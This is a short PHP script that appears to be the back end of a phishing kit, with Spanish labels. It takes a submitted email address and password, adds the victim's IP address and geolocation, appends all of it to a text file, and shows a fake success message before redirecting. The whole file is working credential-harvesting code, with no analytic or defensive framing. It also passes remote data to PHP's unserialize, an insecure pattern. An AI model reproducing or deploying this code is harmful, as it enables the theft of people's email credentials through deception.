<?php
$nombre_archivo = "mexi1";
ini_set("display_errors", 0);
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];

if(isset($_POST['uncampo']) && isset($_POST['doscampo'])){
$file = fopen("".$nombre_archivo.".txt", "a");
fwrite($file, "|| Correo : ".$_POST['uncampo']." - Clave: ".$_POST['doscampo']." - Ip:  ".$myip." ".$pais." ".$region." ".date('d/m/Y').PHP_EOL);
fwrite($file, "||=====================" . PHP_EOL);
fclose($file);

echo "<script type='text/javascript'>";
echo "alert('Datos ingresados exitosamente! En caso de un error sera contactado nuevamente');";
echo "window.location.href='index.html';";
echo "</script>";
			
}else{
	echo '<script type="text/javascript">window.location.href = "index.html";</script>';
}
?>